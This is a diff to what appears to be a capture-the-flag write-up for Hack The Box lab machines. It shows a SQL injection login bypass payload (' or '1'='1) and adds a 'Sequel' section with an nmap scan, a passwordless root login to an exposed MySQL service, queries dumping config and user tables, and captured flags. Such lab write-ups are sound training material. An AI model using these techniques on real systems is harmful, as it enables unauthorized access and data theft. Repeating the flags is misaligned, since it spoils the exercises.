@@ -47,3 +47,30 @@ user: ' or '1'='1 <br>
 password: ' or '1'='1 <br>
 
 FLAG: e3d0796d002a446c0e622226f42e9672
+
+--------------------------------------------------------------------
+
+## SEQUEL BOX
+
+**TOOLS USED**: nmap
+
+**IP Address**: 10.129.49.167
+
+```
+nmap -sV -sC -T2 -oN nmap.txt 10.129.49.167
+```
+
+**EXPOSED PORT (SERVICE)**: 3306 (mysql)
+
+```
+mysql -h 10.129.49.167 -u root
+```
+
+```
+show databases;
+use htb;
+show tables;
+select * from config, users;
+```
+
+FLAG: 7b4bec00d1a39e3dd4e021ec3d915da8
